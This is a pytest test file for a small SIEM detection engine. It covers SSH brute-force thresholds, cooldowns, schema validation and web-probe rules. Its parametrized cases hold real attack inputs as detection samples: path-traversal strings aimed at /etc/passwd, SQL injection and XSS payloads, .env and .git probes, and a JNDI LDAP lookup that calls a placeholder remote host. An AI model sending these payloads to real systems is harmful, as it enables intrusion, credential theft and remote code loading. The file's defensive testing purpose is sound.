from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from minisiem.detection import RuleEngine, RuleError, load_rules
from minisiem.models import Event, EventType, Severity
from minisiem.parsers import AuthLogParser, NginxParser

ROOT = Path(__file__).resolve().parent.parent
T0 = datetime(2026, 11, 18, 10, 0, 0, tzinfo=UTC)


def ssh(kind, ip="203.0.113.7", user="root", seconds=0.0):
    return Event(
        ts=T0 + timedelta(seconds=seconds),
        source="auth",
        type=kind,
        src_ip=ip,
        user=user,
        raw=f"{kind} {user} {ip}",
    )


def http(path, status=200, ua="Mozilla/5.0", ip="198.51.100.9", seconds=0.0):
    ts = (T0 + timedelta(seconds=seconds)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'{ip} - - [{ts}] "GET {path} HTTP/1.1" {status} 10 "-" "{ua}"'
    ev = NginxParser().parse(line)
    assert ev is not None, line
    return ev


@pytest.fixture(scope="module")
def shipped_rules():
    return load_rules(ROOT / "rules")


@pytest.fixture
def engine(shipped_rules):
    return RuleEngine(shipped_rules)


def write_rules(tmp_path, text):
    f = tmp_path / "r.yml"
    f.write_text(text, encoding="utf-8")
    return load_rules(f)


# --- schema -----------------------------------------------------------------


def test_shipped_rules_are_valid(shipped_rules):
    ids = {r.id for r in shipped_rules}
    assert {"ssh-bruteforce", "web-directory-scan", "web-path-traversal"} <= ids
    assert all(r.mitre for r in shipped_rules), "every shipped rule maps to ATT&CK"


@pytest.mark.parametrize(
    "body, fragment",
    [
        ("rules:\n  - {id: x, name: x, type: threshold, window: 60}", "threshold"),
        ("rules:\n  - {id: x, name: x, type: magic}", "type"),
        ("rules:\n  - {id: Bad Id, name: x, type: pattern}", "id"),
        ("rules:\n  - {id: x, name: x, type: pattern, mitre: [X123]}", "MITRE"),
        ("rules:\n  - {id: x, name: x, type: pattern, typo_field: 1}", "typo_field"),
        (
            "rules:\n  - {id: x, name: x, type: pattern, patterns: [{field: path, regex: '(['}]}",
            "invalid regex",
        ),
        ("rules: [\n", "invalid YAML"),
    ],
)
def test_schema_rejects_bad_rules(tmp_path, body, fragment):
    with pytest.raises(RuleError, match=fragment):
        write_rules(tmp_path, body)


def test_duplicate_ids_rejected(tmp_path):
    (tmp_path / "a.yml").write_text("rules:\n  - {id: x, name: a, type: pattern}\n")
    (tmp_path / "b.yml").write_text("rules:\n  - {id: x, name: b, type: pattern}\n")
    with pytest.raises(RuleError, match="duplicate"):
        load_rules(tmp_path)


# --- threshold windows ------------------------------------------------------


def test_ssh_bruteforce_fires_on_preauth_disconnects_key_only_server(engine):
    parser = AuthLogParser(tz=UTC, now=T0)
    lines = [
        f"Nov 18 10:00:{i * 10:02d} web1 sshd-session[{100 + i}]: {text} authenticating user "
        f"root 203.0.113.5 port {40000 + i} [preauth]"
        for i, text in enumerate(
            [
                "Connection closed by",
                "Disconnected from",
                "Connection reset by",
                "Connection closed by",
                "Disconnected from",
            ]
        )
    ]
    alerts = []
    for line in lines:
        ev = parser.parse(line)
        assert ev is not None, line
        alerts += engine.process(ev)
    assert [a.rule_id for a in alerts] == ["ssh-bruteforce"]
    assert alerts[0].key == "203.0.113.5"
    assert alerts[0].count == 5


def test_ssh_bruteforce_fires_on_fifth_failure_within_60s(engine):
    alerts = []
    for i in range(5):
        alerts += engine.process(ssh(EventType.SSH_FAILED, seconds=i * 10))
    assert [a.rule_id for a in alerts] == ["ssh-bruteforce"]
    alert = alerts[0]
    assert alert.key == "203.0.113.7"
    assert alert.count == 5
    assert alert.severity == Severity.HIGH
    assert alert.mitre == ["T1110.001"]
    assert "5 failed logins in 60s" in alert.message


def test_failures_spread_beyond_window_do_not_fire(engine):
    alerts = []
    for i in range(10):
        alerts += engine.process(ssh(EventType.SSH_FAILED, seconds=i * 16))  # 4 per minute
    assert alerts == []


def test_windows_are_per_ip(engine):
    alerts = []
    for i in range(4):
        alerts += engine.process(ssh(EventType.SSH_FAILED, ip="203.0.113.1", seconds=i))
        alerts += engine.process(ssh(EventType.SSH_FAILED, ip="203.0.113.2", seconds=i))
    assert alerts == []


def test_cooldown_suppresses_repeats_then_reports_count(engine):
    fired = []
    # 30 failures in 30 s: one alert, the next two "threshold crossings" are suppressed.
    for i in range(15):
        fired += engine.process(ssh(EventType.SSH_FAILED, seconds=i))
    assert len(fired) == 1
    assert engine.suppressed_total == 2
    # After the 600 s cooldown a new burst alerts again and mentions the suppressed ones.
    for i in range(5):
        fired += engine.process(ssh(EventType.SSH_FAILED, seconds=700 + i))
    assert len(fired) == 2
    assert "+2 suppressed" in fired[1].message


def test_distinct_counting_for_user_enumeration(engine):
    alerts = []
    for i in range(20):  # the same user over and over is not enumeration
        alerts += engine.process(ssh(EventType.SSH_INVALID_USER, user="admin", seconds=i))
    assert not [a for a in alerts if a.rule_id == "ssh-user-enumeration"]
    for i, user in enumerate(["a", "b", "c", "d", "e", "f", "g"]):
        alerts += engine.process(ssh(EventType.SSH_INVALID_USER, user=user, seconds=30 + i))
    assert [a.rule_id for a in alerts] == ["ssh-user-enumeration"]


def test_directory_scan_counts_distinct_404_paths(engine):
    alerts = []
    for i in range(19):
        alerts += engine.process(http(f"/admin{i}.php", status=404, seconds=i))
    assert alerts == []
    alerts += engine.process(http("/admin19.php", status=404, seconds=20))
    assert [a.rule_id for a in alerts] == ["web-directory-scan"]


# --- sequence / pattern -----------------------------------------------------


def test_success_after_failures(engine):
    for i in range(6):
        engine.process(ssh(EventType.SSH_FAILED, user="deploy", seconds=i * 20))
    alerts = engine.process(ssh(EventType.SSH_ACCEPTED, user="deploy", seconds=200))
    assert [a.rule_id for a in alerts] == ["ssh-login-after-failures"]
    assert alerts[0].severity == Severity.CRITICAL


def test_success_without_prior_failures_is_quiet(engine):
    assert engine.process(ssh(EventType.SSH_ACCEPTED, user="emre")) == []


def test_root_login(engine):
    alerts = engine.process(ssh(EventType.SSH_ACCEPTED, user="root"))
    assert [a.rule_id for a in alerts] == ["ssh-root-login"]


@pytest.mark.parametrize(
    "path",
    [
        "/../../etc/passwd",
        "/static/..%2f..%2f..%2fetc%2fpasswd",
        "/files?name=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "/download?f=..\\..\\windows\\win.ini",
        "/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts",
    ],
)
def test_path_traversal_variants(engine, path):
    rules = {a.rule_id for a in engine.process(http(path, status=400))}
    assert "web-path-traversal" in rules


@pytest.mark.parametrize(
    "path, rule",
    [
        ("/item?id=1%20UNION%20SELECT%20username,password%20FROM%20users", "web-sqli-probe"),
        ("/login?user=admin'%20OR%20'1'='1", "web-sqli-probe"),
        ("/p?id=1%20AND%20SLEEP(5)", "web-sqli-probe"),
        ("/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "web-xss-probe"),
        ("/.env", "web-sensitive-file-probe"),
        ("/.git/config", "web-sensitive-file-probe"),
        ("/?x=${jndi:ldap://192.0.2.1/a}", "web-rce-probe"),
    ],
)
def test_web_probes(engine, path, rule):
    assert rule in {a.rule_id for a in engine.process(http(path, status=404))}


@pytest.mark.parametrize(
    "path",
    ["/", "/blog/2026/11/hello-world", "/search?q=salt+and+pepper", "/img/logo.svg?v=3"],
)
def test_normal_requests_are_quiet(engine, path):
    ev = http(path)
    assert engine.process(ev) == []
    assert not ev.suspicious


def test_scanner_user_agent_and_tagging(engine):
    ev = http("/", ua="sqlmap/1.8.2#stable (https://sqlmap.org)")
    alerts = engine.process(ev)
    assert [a.rule_id for a in alerts] == ["web-scanner-user-agent"]
    assert ev.tags == ["web-scanner-user-agent"]
    assert ev.suspicious


def test_pattern_rule_cooldown(engine):
    a1 = engine.process(http("/.env", seconds=0))
    a2 = engine.process(http("/.env.bak", seconds=5))
    assert len(a1) == 1 and a2 == []


# --- engine options ---------------------------------------------------------


def test_ignore_networks(shipped_rules):
    engine = RuleEngine(shipped_rules, ignore_networks=["203.0.113.0/24"])
    alerts = []
    for i in range(10):
        alerts += engine.process(ssh(EventType.SSH_FAILED, seconds=i))
    assert alerts == []


def test_exclude_and_disabled(tmp_path):
    rules = write_rules(
        tmp_path,
        """
rules:
  - id: a
    name: A
    type: pattern
    match: {event_type: ssh_accepted}
    exclude: {user: [emre, deploy]}
  - id: b
    name: B
    type: pattern
    enabled: false
""",
    )
    engine = RuleEngine(rules)
    assert engine.process(ssh(EventType.SSH_ACCEPTED, user="emre")) == []
    assert [a.rule_id for a in engine.process(ssh(EventType.SSH_ACCEPTED, user="x"))] == ["a"]


def test_gc_drops_idle_state(engine):
    from minisiem.detection import engine as engine_mod

    for i in range(3):
        engine.process(ssh(EventType.SSH_FAILED, ip=f"203.0.113.{i}", seconds=i))
    assert engine.state_size() > 0
    engine._gc(T0 + timedelta(days=1))
    assert engine.state_size() == 0
    assert engine_mod.GC_EVERY > 0
